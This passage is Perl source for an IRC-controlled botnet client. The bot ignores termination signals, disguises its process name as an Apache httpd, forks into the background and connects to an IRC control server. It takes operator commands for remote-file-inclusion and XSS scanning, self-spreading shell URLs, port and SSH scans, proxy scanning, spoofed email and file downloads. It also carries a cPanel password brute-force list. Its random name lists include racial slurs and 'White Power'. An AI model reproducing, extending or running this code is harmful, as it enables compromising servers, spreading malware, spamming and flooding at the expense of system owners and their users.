    "rune",     "alan",           "britt",  "brita",
    "stue",     "stenen",         "andy",   "bass",
    "phatt",    "lover",          "fresa",  "jvc",
    "jbl",      "cia",            "fed",    "sov",
    "purk",     "snut",           "snif",   "deka",
    "svovel",   "life",           "knife",  "so",
    "deka",     "bos",            "boss",   "fres",
    "spett",    "dusj",           "kappe",  "norman",
    "keb0rd",   "fab",            "dor",    "bits",
    "kniv",     "lisa",           "nina",   "ole",
    "pat",      "mtv",            "charl",  "smokie",
    "nabo",     "walk",           "brks",   "krad-3",
    "se",       "no",             "de",     "dk",
    "it",       "fr",             "op",     "mode",
    "loc",      "sa",             "za",     "yu",
    "jufr",     "fred",           "peace",  "tr",
    "baat",     "bbc",            "nbc",    "vcb",
    "coffe",    "dark",           "morkz",  "svart",
    "neger",    "slave",          "dohgz",  "dame",
    "lady",     "bola",           "biffen", "kamm",
    "drev",     "sprider",        "spider", "iscrem",
    "daddy",    "pie",            "ono",    "tima",
    "mytm",     "motor",          "vsmot",  "sport",
    "fart",     "devs",           "var",    "tmp",
    "spol",     "sture" . "jule", "tree",   "gate",
    "net",      "rand",           "perl",   "line",
    "xqt",      "mrx",            "org",    "asus",
    "sped",     "yaco",           "hash",   "hmm",
    "ddos",     "pwr",            "nix",    "linux",
    "bsd",      "ppal",           "aio",    "mars",
    "bates",    "daim",           "da",     "lava",
    "cisco",    "sssl",           "https",  "ophra",
    "lonely",   "mred",           "both",   "tcpip",
    "udp",      "inetd",          "sl",     "pico",
    "nmap",     "juge",           "sone",   "log",
    "goofy",    "kars",           "meter",  "daim",
    "kul",      "foksy",          "hyena",  "beta",
    "pulse",    "driver",         "org",    "fos",
    "kars",     "kma",            "fua",    "all",
    "tea",      "foks",           "lady",   "fa",
    "testo",    "bola",           "bolen",  "card",
    "cards",    "chip",           "chips",  "wv",
    "audi",     "bmw",            "roys",   "bechs",
    "nokia",    "mrx",            "some",   "candy",
    "goo",      "cool",           "scam",   "scan",
    "google",   "lee",            "cam",    "li",
    "dm",       "loff",           "grov",   "abcd",
    "pulse",    "grow",           "alrt",   "spyd",
    "trojn",    "maxd",           "xeqtd",  "xQtd",
    "nodz",     "raptor",         "swedn",  "den",
    "ger",      "geir",           "dell",   "suport",
    "user",     "lima",           "foss",   "karss",
    "goofy",    "pid",            "slow",   "view",
    "lmn",      "lsd",            "lds",    "as",
    "ass",      "pff",            "yuo",    "had",
    "afraid",   "afric",          "noo",    "owner",
    "crime",    "data",           "need",   "doper",
    "hash",     "mysql",          "imapd",  "devil",
    "shark",    "byn",            "ju"
);

my @RName = (
    "Googurl (C) 2006 xeQt",
    "www.Google.com",
    "* Im to lame to read Bitchx.doc *",
    "BiatchX",
    "BGjengen suger",
    "Tveita ligaen",
    "Audi liga",
    "Audi Sport RSTurbo",
    "Audi RSR4",
    "Escort cosworth",
    "Tveita Gjengen",
    "Bgjengen",
    "Agjengen",
    "locos",
    "putas",
    "spooon",
    "Type-R Turbo",
    "Civic R Turbo",
    "mIRC 6.1",
    "* Im so lame i cant read BitchX.doc *",
    "Bill Gates",
    "Cannon",
    "Mtv",
    "nos",
    "nozzz",
    "Sport Crew",
    "vTeam",
    "Turbo",
    "random",
    "paypal",
    "netscam",
    "www.milw0rm.com",
    "lee",
    "av",
    "freace",
    "trojan donkey",
    "Monster Garage",
    "Garage Inc.",
    "Pimp Ma Shit",
    "Pimp my ride",
    "Freak out",
    "Doch",
    "www.packetstormsecurity.org",
    "www.linux.com",
    "www.freebsd.org",
    "Hello There",
    "tyson",
    "mekkkka",
    "Im just myself man",
    "Can u get the clue?",
    "Im not the only one",
    "Fear the lions",
    "mekka",
    "nooo",
    "Dragons back",
    "Turbo Quattro",
    "Sport Quattro",
    "aheh goofy",
    "Just for phun",
    "gBill",
    "goa",
    "Yesir",
    "Thats my mofo name",
    "Snoooop Doggy Style...",
    "Tricky Trickey",
    "love, peace, and xeQt",
    "rbot",
    "ha",
    "Clap your hands",
    "one two tree, bass",
    "lions",
    "Drugs, sex, and xtc",
    "i hate that biatch",
    "ali",
    "Go fuck yourself",
    "whois meeee",
    "Fatjoe Corp",
    "Brooklyn Bounche",
    "Dj Pulsedriver",
    "lee",
    "furutre",
    "Dont you wish?",
    "Go screw yourself biatch",
    "Smoke and fly",
    "fuck mobb deep, Fuck bin laden",
    "hai",
    "Random",
    "You have no clue",
    "This rocks",
    "uranium",
    "BinLaden",
    "Ted Bundy",
    "Charlie Cheeens",
    "hans",
    "Will Smith",
    "Freash Prince On IRC",
    "Freash prince in bel air",
    "Powered By PHPBB",
    "mambo",
    "ruyo has",
    "dj pulse",
    "Powered By xeQt",
    "Delux",
    "2pac",
    "Biggie",
    "Fuck sadam",
    "Allah",
    "Im your god idiot",
    "id",
    "Im to lame to read BitchX.doc",
    "Boika",
    "Diamonds",
    "Jean claude Van dame",
    "Arnold Schwartsneger ids",
    "Stig",
    "Anothony",
    "White Power",
    "Just do it",
    "vSmotor vs. Turbo",
    "Nismo Skyline GT-R R34",
    "MySquad",
    "Honda Civic Type-R",
    "Maria Carrey",
    "Terror Squad",
    "I'm to lame to read BitchX.doc",
    "w33d",
    "hugo serv",
    "WinXP 1999 (C) Bill Gates",
    "Microsoft windows xeQtxpress",
    "xeQt vS Mrx Team",
    "Apache httpd server",
    "arne",
    "line",
    "geir",
    "terje",
    "synne",
    "linda",
    "frode",
    "my name?",
    "teamrxPress",
    "xeqters",
    "asus power",
    "Crash Test Dummy",
    "Madonna",
    "vX power",
    "Team Windows",
    "Bill Gates",
    "Bill Gatez",
    "Thats my girl...haha",
    "Life by the gun! Die by it.",
    "Thugz 4 life",
    "Nothugz",
    "Torshov mafia",
    "Hells Angles",
    "Bandidosssss",
    "Phunter",
    "panter",
    "Snaked",
    "Hunted",
    "Victums",
    "PHPSH",
    "mod_com_xQt",
    "com_xeQter",
    "com_team",
    "assasins",
    "Nokia, Connecting People...",
    "BitchX",
    "smoke and fly",
    "com_xeQt_Performance",
    "TeaMrx Performance",
    "Just another junkie",
    "I Need help?",
    "Fuck it, die",
    "perl n die",
    "Code n die",
    "fuck bush and sadam.",
    "xQt",
    "Perlbot version vx9m0d v3",
    "Googurl",
    "Google lovers",
    "xeQt_com",
    "mrx_unit",
    "com_asus",
    "haist.",
    "TeaMrx Crew",
    "xQt vS TeaMrx",
    "xeQt vS Mrx",
    "Powered by TeaMrx",
    "Powered by xQt",
    "com_xQt_mrx",
    "com_x",
    "com_teamrx",
    "xeQt the way to go",
    "Perl monks",
    "perlhackers",
    "perl genius",
    "perl team",
    "perl scanner..",
    "Peace, Love, And Extasy",
    "Segmentation fault (core dumped)",
    "host.futuracreative",
    "www.microsoft.com.",
    "Andy Morgans",
    "MS13",
    "Explosive Childrens",
    "Calcutta",
    "Mr Alban, no. Dr Alban",
    "Mr dre",
    "Fuck bad boy",
    "Arnold svartneger",
    "svartneger arnold",
    "pimp my ride",
    "asus powered, teamrx",
    "teamrx gtr nismo 3",
    "chao",
    "Afroman, Yaman.",
    "GanjaGang, all day long",
    "AfroBabe",
    "ActionGirl",
    "POwer ranger",
    "Texas ranger",
    "C.I.A",
    "C22 Blowup!",
    "C4 DownTown",
    "Blow Shit Up",
    "Fuck it, im done",
    "Screw you shit head",
    "Dont fucking whoisme",
    "San Francisco",
    "New York Gangbang..",
    "Team Norway",
    "Team Europe",
    "Team Germany",
    "Team Work",
    "jet lie"
);

my @Mrx = (
    "mIRC32 v5.91 K.Mardam-Bey",
    "mIRC v6.2 Khaled Mardam-Bey",
    "mIRC v6.03 Khaled Mardam-Bey",
    "mIRC v6.14 Khaled Mardam-Bey",
    "mIRC v6.15 Khaled Mardam-Bey",
    "mIRC v6.16 Khaled Mardam-Bey",
    "mIRC v6.17 Khaled Mardam-Bey",
    "mIRC v6.21 Khaled Mardam-Bey",
    "vxAio v1.6x m0d By xeQt 2007",
    "JPilot IRC Java Client 2.32",
    "Quarterdeck Global Chat 1.2.9 for Macintosh",
    "Snak for Macintosh 4.9.8 English",
    "vxAio 2.0 Private By TeaMrx vS xeQt",
    "DvC v0.1 PHP-5.1.1 based on Net_SmartIRC",
    "irssi v0.8.10 - running on OpenBSD i386",
    "irssi v0.8.10 - running on OpenBSD i686",
    "irssi v0.8.2 - running on Linux i386",
    "irssi v0.8.3 - running on Linux i686",
    "irssi v0.8.5 - running on Linux i386",
    "irssi v0.8.7 - running on Linux i686",
    "xchat 2.6.2 Linux 2.6.18.5 [i686/2.67GHz]",
    "xchat:2.4.3:Linux 2.6.17-1.2142_FC4 [i686/2,00GHz]",
    "xchat:2.4.3:Linux 2.6.17-1.2142_FC4 [i686/1.70GHz]",
    "XChat-GNOME IRC Chat 0.16 Linux 2.6.20-8-generic [i686]",
    "ircN 7.27 + 7.0 - -\001",
    "\001..(argon/1g) :bitchx-1.0c17",
    "ircN 8.00 - he tries to tell me what I put inside of me -",
    "FreeBSD!4.11-STABLE bitchx-1.0c18 - prevail[0123] :down with people",
    "BitchX-1.0c19+ by panasync - Linux 2.4.31 : Keep it to yourself!",
    "BitchX-1.0c19+ by panasync - Linux 2.4.33.3 : Keep it to yourself!",
    "BitchX-1.1-final+ by panasync - Linux 2.6.18.1 : Keep it to yourself!",
    "BitchX-1.0c19 by panasync - freebsd 4.10-STABLE : Keep it to yourself!",
    "BitchX-74p1+Tcl1.3f by panasync - Linux 2.0.35 : Keep it to yourself!",
    "BitchX-1.1-final+ by panasync - FreeBSD 4.5-STABLE : Keep it to yourself!",
"BitchX-1.1-final+ by panasync - FreeBSD 6.0-RELEASE : Keep it to yourself!",
"BitchX-1.1-final+ by panasync - FreeBSD 5.3-RELEASE : Keep it to yourself!",
"BitchX-1.0c17/FreeBSD 4.10-RELEASE:(c)rackrock/bX [3.0.1&#225;9] : Keep it to yourself!",
"P&P 4.22.2 (in development) + X Z P Bots, Sound, NickServ, ChanServ, Extras",
"HydraIRC v0.3.148 (18/Jan/2005) by Dominic Clifton aka Hydra - #HydraIRC on EFNet\001",
    "irssi v0.8.10 - running on Linux i586\001",
    "\001irssi v0.8.10 - running on FreeBSD i386",
"ircII 20050423+ScrollZ 1.9.5 (19.12.2004)+Cdcc v1.6mods v1.0 by acidflash - Almost there",
"ircII 20050423+ScrollZ 1.9.5 (19.12.2004)+Cdcc v1.8+OperMods v1.0 by acidflash - Almost there"
);

my @fakeps = (
    "/usr/local/apache/bin/httpd -DSSL",
    "/usr/local/apache/bin/httpd -k start",
    "/usr/sbin/apache2 -k start -DSSL",
    "/usr/sbin/httpd -k start -DSSL",
    "/usr/sbin/apache",
    "httpd",
    "[httpd]"
);

my @GoogleDomene = (
    "www.google.com",   "www.google.it",
    "www.google.pl",    "www.google.com.mx",
    "www.google.co.uk", "www.google.com.br",
    "www.google.fr",    "www.google.ie",
    "www.google.ae",    "www.google.ro",
    "www.google.es",    "www.google.ca",
    "www.google.no",    "www.google.de",
    "www.google.fr",    "www.google.cz",
    "www.google.lt"
);

my @domene = (
    "info", "net", "org", "no", "se", "de", "com",  "pe", "br", "ca",
    "fi",   "pl",  "ro",  "ru", "in", "do", "su",   "pk", "ms", "ve",
    "cy",   "as",  "ae",  "de", "ve", "hu", "ar",   "at", "ro", "ru",
    "mm",   "mn",  "nm",  "a",  "b",  "c",  "info", "gr", "pe", "br",
    "es",   "tr",  "il",  "ie", "eg", "fi", "do",   "ms", "ws", "ps",
    "net",  "com", "org", "ch", "cc", "br", "lv",   "sz", "rj", "tz",
    "io",   "tf",  "tp",  "tg", "to", "tt", "info", "ao", "ai", "aq",
    "ag",   "an",  "sa",  "dz", "ar", "am", "aw",   "at", "az", "bs",
    "bh",   "bd",  "bb",  "be", "bz", "bj", "bm",   "bt", "by", "ba",
    "bw",   "bn",  "bg",  "bf", "bi", "vc", "kh",   "cm", "td", "cs",
    "cy",   "km",  "cg",  "cd", "dj", "dm", "ci",   "cr", "hr", "kp",
    "eg",   "sv",  "aw",  "er", "sk", "ee", "et",   "ge", "fi", "fr",
    "ga",   "gs",  "gh",  "gi", "gb", "uk", "gd",   "gl", "gp", "gu",
    "gt",   "gg",  "gn",  "gw", "gq", "gy", "gf",   "ht", "nl", "sh",
    "lc",   "va",  "st",  "sn", "sc", "sl", "sg",   "so", "lk", "za",
    "sd",   "se",  "sr",  "jm", "sg", "id", "cl",   "cx", "ca", "nz",
    "pk",   "hu"
);

my @useragents = (
'Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1',
'Mozilla/4.0 (compatible; MSIE is not me; DAUMOA/1.0.1; DAUM Web Robot; Daum Communications Corp., Korea) ',
    'Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.0.9) Geck',
    'Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.0.8) Geck',
    'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; (R1 1',
    'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1',
    'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)',
    'Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.1) Gecko/',
    'Mozilla/5.0 (Windows; U; Windows NT 5.0; nl; rv:1.8.0.9) Geck',
    'Mozilla/4.0 (compatible; MSIE 5.0; Mac_PowerPC)',
    'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2',
    'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)'
);

my @cpanelpasswds = (
    "1",          "12",         "123",        "1234",
    "12345",      "123456",     "1234567",    "12345678",
    "123456789",  "1234567890", "admin",      "root",
    "pass",       "passwd",     "password",   "Pass",
    "Passwd",     "PassWd",     "PassWord",   "pwd",
    "login",      "Admin",      "admin",      "test",
    "123123",     "1212",       "12341234",   "zxcvbnm",
    "zxcvbn",     "zxcvb",      "zxcv",       "zxc",
    "q1w2e3r4",   "q1w2e3",     "q1w2e3r4t5", "1q2w3e4r5t",
    "1q2w3e4r",   "1q2w3e",     "demo",       "morgan",
    "ferrari",    "italia",     "usa",        "clinton",
    "dart",       "call",       "asdf",       "asdfg",
    "asdfgh",     "qazwsx",     "qazxsw",     "qwertyu",
    "qwertyuiop", "qwertyuio",  "qwertyu",    "qwerty",
    "qwert",      "qwer",       "james",      "hosting",
    "temp",       "test1",      "test12",     "test123",
    "tester",     "testing",    "cpanel",     "default",
    "Login",      "admin.",     "cpanels",    "web",
    "master",     "webmaster",  "dark",       "support",
    "darby",      "mail",       "dick",       "mary",
    "evil",       "nissan",     "toyota",     "kingkong",
    "superman",   "super",      "supra",      "data",
    "service",    "server",     "weed",       "abc",
    "abc123",     "hello",      "terror",     "binladen",
    "europe",     "website",    "mypass",     "pass1",
    "pass12",     "pass123",    "pass1234",   "passwd1",
    "darby"
);

$IRCServerConn = "$ServList[rand scalar @ServList]" unless $IRCServerConn;
$IRCServerConn = "$ARGV[0]" if $ARGV[0];

my $nick     = $NickName[ rand scalar @NickName ];
my $ircname  = $Idents[ rand scalar @Idents ];
my $porta    = $rport[ rand scalar @rport ];
my $realname = $RName[ rand scalar @RName ];
my $sctcp    = $Mrx[ rand scalar @Mrx ];

my $rootpath = "/usr/lib/libsh/.sniff/";
my $userpath = "/tmp/";
my $xVers;
my $cmoff = 0;

$SIG{'INT'}  = 'IGNORE';
$SIG{'HUP'}  = 'IGNORE';
$SIG{'TERM'} = 'IGNORE';
$SIG{'CHLD'} = 'IGNORE';
$SIG{'PS'}   = 'IGNORE';

eval "use HTTP::Request;";
if ($@) { $xVers = '15vx12A15io 12v152.1'; $cmoff++; }
else    { $xVers = '7vx12A7io 12v122.1'; }
eval "use LWP::UserAgent;";
if ($@) { $xVers = '15vx12A15io 12v152.1'; $cmoff++; }
else    { $xVers = '7vx12A7io 12v122.1'; }

# RealPSx! xeQt..
my $uid = `id -u`;
if ( $uid =~ /^0$/ ) {
    $0 = $xeQters . "\0" x 16;
    chdir($rootpath);
}
else {
    @processer = `ps x|grep -E "http|httpd|apache|apache2|mysql|postgrep|smbd"`;
    foreach $lines (@processer) {
        if (   ( $lines =~ /\/(.+)/ )
            && ( $lines !~ /grep/i )
            && ( $lines !~ /perl/i ) )
        {
            if (   ( $lines !~ /wget/i )
                && ( $lines !~ /curl/i )
                && ( $lines !~ /fetch/i )
                && ( $lines !~ /GET/i )
                && ( $lines !~ /lwp-download/i )
                && ( $lines !~ /lynx/i ) )
            {
                $bg = $1;
            }
        }
        if (   ( $bg =~ /^\//i )
            || ( $bg =~ /^\/\//i )
            || ( $bg =~ /^[httpd]$/ )
            || ( $bg =~ /^httpd$/ ) )
        {
            $bg = "$bg";
        }
        else {
            $bg = "/$bg";
        }
        if ( ( length($bg) <= 3 ) || ( $bg =~ m/.txt$/i ) ) {
            $bg = $fakeps[ rand scalar @fakeps ];
        }
        $0 = "$bg" . "\0" x 16;
        chdir($userpath);
    }
}
my $pid = fork;
exit if $pid;
die "Error: Fork(): $!" unless defined($pid);

our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();
$sel_cliente = IO::Select->new();

sub sendraw {
    if ( $#_ == '1' ) {
        my $socket = $_[0];
        print $socket "$_[1]\n";
    }
    else {
        print $IRC_cur_socket "$_[0]\n";
    }
}

sub ircxeqter {
    my $meunick    = $_[0];
    my $ServerConn = $_[1];
    my $ServerPort = $_[2];
    my $IRC_socket = IO::Socket::INET->new(
        Proto    => "tcp",
        PeerAddr => "$ServerConn",
        PeerPort => "$ServerPort"
    ) or return (1);
    if ( defined($IRC_socket) ) {
        $IRC_cur_socket = $IRC_socket;
        $IRC_socket->autoflush(1);
        $sel_cliente->add($IRC_socket);
        $irc_servers{$IRC_cur_socket}{'host'}  = "$ServerConn";
        $irc_servers{$IRC_cur_socket}{'porta'} = "$ServerPort";
        $irc_servers{$IRC_cur_socket}{'nick'}  = $meunick;
        $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;
        nick("$meunick");
        sendraw("USER $ircname "
              . $IRC_socket->sockhost
              . " $ServerConn :$realname" );
    }
}

my $line_temp;
while (1) {
    while ( !( keys(%irc_servers) ) ) {
        ircxeqter( $NickName[ rand scalar @NickName ], $IRCServerConn, $porta );
    }
    delete( $irc_servers{''} ) if ( defined( $irc_servers{''} ) );
    my @ready = $sel_cliente->can_read(0);
    next unless (@ready);
    foreach $fh (@ready) {
        $IRC_cur_socket = $fh;
        $meunick        = $irc_servers{$IRC_cur_socket}{'nick'};
        $nread          = sysread( $fh, $msg, 4096 );
        if ( $nread == 0 ) {
            $sel_cliente->remove($fh);
            $fh->close;
            delete( $irc_servers{$fh} );
        }
        @lines = split( /\n/, $msg );
        for ( my $c = 0 ; $c <= $#lines ; $c++ ) {
            $line      = $lines[$c];
            $line      = $line_temp . $line if ($line_temp);
            $line_temp = '';
            $line =~ s/\r$//;
            unless ( $c == $#lines ) {
                parse("$line");
            }
            else {
                if ( $#lines == 0 ) {
                    parse("$line");
                }
                elsif ( $lines[$c] =~ /\r$/ ) {
                    parse("$line");
                }
                elsif ( $line =~ /^(\S+) NOTICE AUTH :\*\*\*/ ) {
                    parse("$line");
                }
                else {
                    $line_temp = $line;
                }
            }
        }
    }
}

sub parse {
    my $ServerArgs = shift;
    if ( $ServerArgs =~ /^PING \:(.*)/ ) { sendraw("PONG :$1"); }
    elsif ( $ServerArgs =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/ ) {
        my $pn       = $1;
        my $Idents   = $2;
        my $hostmask = $3;
        my $chan     = $4;
        my $args     = $5;
        if ( $args =~ /^\001VERSION\001$/ ) {
            notice( "$pn", "\001" . $sctcp . "\001" );
        }
        if ( grep { $_ =~ /^(\Q$pn\E|\Q$hostmask\E)$/i } @TeaMrx ) {
            if ( $chan eq $meunick ) {
                if ( !$shad0w ) { runner( $pn, $args ); }
                else {
                    $shad0w = 0;
                    runner( $pn, $args );
                    $shad0w = 1;
                }
            }
            if ( $args =~ /^!(add|addusr|adduser)\s+(.*)/ ) {
                my $usrhost = $1;
                my $c       = 0;
                if ( $usrhost =~ m/@/i ) {
                    notice( $pn, "Error: <nick/my.address.com>" );
                }
                else {
                    push( @TeaMrx, $usrhost );
                    notice( $pn, "Added: " . $usrhost . " to userlist" );
                }
            }
            if ( $args =~ /^!(usr|user|users|adm|admin|admins)$/ ) {
                my $c = 0;
                foreach $users (@TeaMrx) {
                    $c++;
                    notice( $pn, "[" . $c . "] " . $users . "" );
                    sleep 1;
                }
            }
            if ( $args =~ /^.(.*)/ ) { ircase( "$pn", "$chan", "$1" ); }
            if ( $args =~ /^!m\s+(.*)/ ) {
                &teamrx( $chan, $1 );
            }
            if ( $args =~ /^!s\s+(\S+)\s+(.*)/ ) {
                &rfiscanner( $chan, $1, $2 );
            }
            if ( ( $args =~ /^!(asc|advanced|adv|a)$/ ) && ( !$cmoff ) ) {
                notice( $pn, "ASC Current.Level: " . $ascmethod . "" );
            }
            if ( ( $args =~ /^!asc\s+(.*)/ ) && ( !$cmoff ) ) {
                if ( $1 eq 0 ) {
                    $ascmethod = 0;
                }
                elsif ( $1 eq 1 ) {
                    $ascmethod = 1;
                }
                elsif ( $1 eq 2 ) {
                    $ascmethod = 2;
                }
                elsif ( $1 eq 3 ) {
                    $ascmethod = 3;
                }
                elsif ( $1 eq 4 ) {
                    $ascmethod = 4;
                }
                elsif ( $1 eq "rnd" || $1 eq "rand" || $1 eq "rd" ) {
                    $ascmethod = int( rand(4) );
                }
                notice( $pn, "ASCMode.Scanner: $ascmethod" );
            }
            if ( ( $args =~ /^(!img|-img|-i|!i)$/ ) && ( !$cmoff ) ) {
                if ( !$bcurl ) { notice( $pn, "PHPShell: " . $cmdsh . "" ); }
                else {
                    notice( $pn,
                        "RootSh: " . $cmdsh . " :: Spread: " . $bcurl . "" );
                }
            }
            if ( ( $args =~ /^!page\s+(\d+)/ ) && ( !$cmoff ) ) {
                my $newpage = $1;
                $pages = $newpage;
                my $mix = $pages * 3;
                notice( $pn, "Google:" . $newpage . " :: Kvasir:" . $mix . "" );
            }
            if (   ( $args =~ /^(!fakesh|-fakesh|!print|-print)$/ )
                && ( !$cmoff ) )
            {
                notice( $pn, "Print.Shell: " . $showshell . "" );
            }
            if ( ( $args =~ /^!new\s+(.*)/ ) && ( !$cmoff ) ) {
                my $str = $1;
                my $ret = fix_url($str);
                $cmdsh = $ret;
                notice( $pn, "New.RootSh: " . $cmdsh . "" );
            }
            if ( ( $args =~ /^!newfake\s+(.*)/ ) && ( !$cmoff ) ) {
                $cmdfake = $1;
                my $str = fix_url($cmdfake);
                $showshell = $str;
                notice( $pn, "New.FakeShell: " . $showshell . "" );
            }
            if ( ( $args =~ /^!t\s+(.*)/ ) && ( !$cmoff ) ) {
                &vulntester( $chan, $1 );
            }
            if ( ( $args =~ /^!visit\s+(.*)/ ) && ( !$cmoff ) ) {
                &urlvisiter( $chan, $1 );
            }
            if ( $args =~ /^!ps\s+(.*)/ ) {
                &portscan( $chan, $1 );
            }
            if ( $args =~ /^!ssh\s+(\S+)\s+(.*)/ ) {
                &portchk( $chan, $1, $2 );
            }
            if ( ( $args =~ /^!newxss\s+(.*)/ ) && ( !$cmoff ) ) {
                my $serv = $1;
                my $ret  = fix_url($serv);
                $ret = $xsimg;
                notice( $pn, "New xss: " . $serv . "" );
            }
            if ( ( $args =~ /^(!xss|-xss)$/ ) && ( !$cmoff ) ) {
                if ( !$xsson ) { notice( $pn, "XSS Scanner: OFF" ); }
                else {
                    notice( $pn, "JavaScript: " . $xsimg . " Scanner: ON" );
                }
            }
            if ( ( $args =~ /^!xss\s+(.*)/ ) && ( !$cmoff ) ) {
                $xl = $1;
                if ( ( $xl eq "on" || $xl eq "ON" || $xl eq "1" ) ) {
                    $xsson = 1;
                    notice( $pn, "XSS Scanner: Scanner ON" );
                }
                elsif ( ( $xl eq "off" || $xl eq "OFF" || $xl eq "0" ) ) {
                    $xsson = 0;
                    notice( $pn, "XSS Scanner: Scanner OFF" );
                }
            }
            if ( $args =~ /^(!sn|-sn|!sendnick|-sendnick)$/ ) {
                if ( !$sendnick ) {
                    notice( $pn, "No Nick Selected ::: usage: !sn <yournick>" );
                }
                else {
                    notice( $pn, "Current.Nick: " . $sendnick . "" );
                }
            }
            if ( $args =~ /^!sn\s+(.*)/ ) {
                my $nn = $1;
                if ( $nn eq "0" ) {
                    $sendnick = 0;
                    notice( $pn, "[12SendNick] Send Priv Messages off." );
                }
                else {
                    $sendnick = $nn;
                    notice( $pn, "New.SendNick: " . $sendnick . "" );
                }
            }
            if (
                (
                    $args =~
                    /^(!bchost|-bchost|-spread|!spread|-spreader|!spreader)$/
                )
                && ( !$cmoff )
              )
            {
                notice( $pn, "Current.Spreader: " . $bcurl . "" );
            }
            if ( ( $args =~ /^!bh\s+(.*)/ ) && ( !$cmoff ) ) {
                my $ar = $1;
                if ( ( $ar eq "0" ) || ( $ar eq "off" ) || ( $ar eq "OFF" ) ) {
                    $bcurl = 0;
                    notice( $pn, "12Spread.Shell: OFF" );
                }
                else {
                    my $ret = fix_url($ar);
                    $bcurl = $ret;
                    notice( $pn, "New.SpreadSH: " . $bcurl . "" );
                }
            }
            if ( ( $args =~ /^!pub\s+(.*)/ ) && ( !$cmoff ) ) {
                if ( $1 eq "off" || $1 eq "OFF" || $1 eq "0" ) {
                    if ( !$public ) {
                        notice( $pn, "Public scanner already OFF" );
                    }
                    else {
                        notice( $pn, "Public scanner switched OFF" );
                        $public = 0;
                    }
                }
                elsif ( $1 eq "on" || $1 eq "ON" || $1 eq "1" ) {
                    if ($public) { notice( $pn, "Public scanner already ON" ); }
                    else {
                        notice( $pn, "Public scanner switched ON" );
                        $public = 1;
                    }
                }
            }
            if ( $args =~ /^!sth\s+(.*)/ ) {
                if ( $1 eq "off" || $1 eq "OFF" || $1 eq "0" ) {
                    if ( !$shad0w ) {
                        notice( $pn, "Stealthmode is already OFF" );
                    }
                    else {
                        notice( $pn, "Stealth bot OFF" );
                        $shad0w = 0;
                    }
                }
                elsif ( $1 eq "on" || $1 eq "ON" || $1 eq "1" ) {
                    if ($shad0w) { notice( $pn, "Stealtmode already ON" ); }
                    else {
                        notice( $pn, "Stealth mode ON" );
                        $shad0W = 1;
                    }
                }
            }
            if ( $args =~ /^(!warn|-warn)$/ ) {
                notice( $pn, "Botwarn is currently $warned" );
            }
            if ( $args =~ /^!warn\s+(.*)/ ) {
                if ( $1 eq "off" || $1 eq "OFF" || $1 eq "0" ) {
                    if ( !$warned ) {
                        notice( $pn, "Botwarn already off" );
                    }
                    else {
                        notice( $pn, "Botwarn turned off" );
                        $warned = 0;
                    }
                }
                elsif ( $1 eq "on" || $1 eq "ON" || $1 eq "1" ) {
                    if ($warned) { notice( $pn, "Botwarn already on" ); }
                    else {
                        notice( $pn, "Botwarn turned on" );
                        $warned = 1;
                    }
                }
            }
            if ( $args =~ /^!xeqt\s+(\S+)\s+(\d+)\s+(\d+)/ ) {
                &xdrop( $chan, $1, $2, $3 );
            }
            if ( $args =~ /^!proxy$/ ) {
                notice( "$pn",
"Usage: !proxy <a/anon/anonymous - t/tp/transparent - h/high/e/elite>"
                );
            }
            if ( $args =~ /^(!proxy|-proxy)\s+(.*)/ ) {
                &proxyscan( $chan, $1 );
            }
            if ( $args =~ /^!mail$/ ) {
                notice( "$pn",
"Usage: !mail Subject fake@mail.com to@target.com Message goes here...."
                );
            }
            if ( $args =~ /^!mail\s+(\S+)\s+(\S+)\s+(\S+)\s+(.*)/ ) {
                &sendmail( $chan, $1, $2, $3, $4 );
            }
            if ( $args =~ m/^!smail$/i )             { checksendmail($chan); }
            if ( $args =~ m/^(-version|-ver|-v)$/i ) { notice( $pn, $xVers ); }
            if ( $args =~ m/^(!version|!ver|!v)$/i ) { msg( $chan, $xVers ); }
            if ( $args =~ m/^(-method|-download|-down|-d|-info|!d)$/i ) {
                sysbotinfo($pn);
            }
            if ( $args =~ m/^(-0|-null|-argv|-argv0)$/i ) {
                notice( $pn, "$$ - $0" );
            }
            if ( $args =~ m/^!(mil|milw0rm|w0rm|w0rms)$/i ) { milw0rm($chan); }
            if ( $args =~ m/^!(storm|packet|packetstorm)$/i ) {
                packetstorm_rss($chan);
            }
            if ( $args =~ /^!crypt\s+(.*)/ ) { vxCrypt( $chan, $1 ); }
            if ( $args =~ /^(!safemode|-safemode|!sm|-sm)$/ ) {
                if ( !$safe_print ) {
                    notice( $pn,
                        "Not sending safemode servers to channel (OFF)" );
                }
                else { notice( $pn, "Safemode print is on" ); }
            }
            if ( ( $args =~ /^!safemode\s+(.*)/ ) && ( !$cmoff ) ) {
                if ( $1 eq "off" || $1 eq "OFF" || $1 eq "0" || $1 eq "stop" ) {
                    if ( !$safe_print ) {
                        notice( $pn, "Safemode print already OFF" );
                    }
                    else {
                        notice( $pn, "Safemode Print: OFF" );
                        $safe_print = 0;
                    }
                }
                elsif ( $1 eq "on" || $1 eq "ON" || $1 eq "1" || $1 eq "start" )
                {
                    if ($safe_print) {
                        notice( $pn, "Safemode print already ON" );
                    }
                    else {
                        notice( $pn, "Safemode Print: ON" );
                        $safe_print = 1;
                    }
                }
            }
            if ( $args =~ /^!decode\s+(.*)/ ) {
                &uridecoder( $chan, $1 );
            }

            # Spread msg!
            if ( ( $args =~ /^-(spon|spron|spmsg|spmsgon)$/ ) && ( !$cmoff ) ) {
                notice( $pn, "Spread Message: On!" );
                $spmsgs = 1;
            }
            if ( ( $args =~ /^-(spoff|sproff|sprmsgoff)$/ ) && ( !$cmoff ) ) {
                notice( $pn, "Spread Message: Off!" );
                $spmsgs = 0;
            }

            # Download
            if ( $args =~ /^!dl\s+(\S+)\s+(\S+)/ ) {
                &getnsave( $chan, $1, $2 );
